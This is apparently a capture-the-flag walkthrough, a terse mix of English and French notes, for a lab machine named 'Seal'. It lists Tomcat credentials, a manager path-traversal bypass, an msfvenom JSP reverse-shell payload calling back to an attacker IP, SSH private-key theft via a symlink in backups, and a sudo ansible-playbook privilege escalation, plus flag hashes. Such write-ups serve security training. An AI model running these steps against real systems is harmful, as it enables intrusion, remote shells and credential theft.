#ip 10.10.10.250 

#user flag : 

https://10.10.10.250/host-manager/text
https://10.10.10.250/conf/tomcat-users.xml 
https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat

user : tomcat
pass : 42MrHBf*z8{Z%

path transvercal tomcat :
http://10.10.10.250:8080

https://10.10.10.250/manager/status/..;/html
https://10.10.10.250/manager/jmxproxy/..;/html/upload?org.apache.catalina.filters.CSRF_NONCE=D9AE2451A740E9F7B10DB346C6B63F63

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f war -o rev.war  

#commande reverse shell :

export TERM=xterm
python3 -c "import pty;pty.spawn('/bin/bash')"
ln -s /home/luis/.ssh /opt/backups/uploads/
cd /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
cp /opt/backups/archives/backup-2021-08-02-01:00:32.gz rsa.gz
gzip -kd rsa.gz
tar -xf rsa
cd /dashboard/uploads
python3 -m http.server 9003
http://10.10.10.250:9003
telecharger fichier rsa
sudo ssh -i id_rsa luis@10.10.10.250 
cat user.txt
d640b7d24c41368455c4e15f492427db


#root flag :
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *

fichier run.yml :
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/root/root.txt dest=/opt/backups/playbook copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/

fichier test.yml:
  - name: Check the disk usage of all the file system in the remote servers
    hosts: localhost
    tasks:
      - name: Execute the cat command
        register: dfout
        command: "cat ./root.txt"

      - debug:
          var: dfout.stdout_lines

sudo ansible-playbook test.yml

root flag : 
e972acafe072538a2854924ec65c7b4f"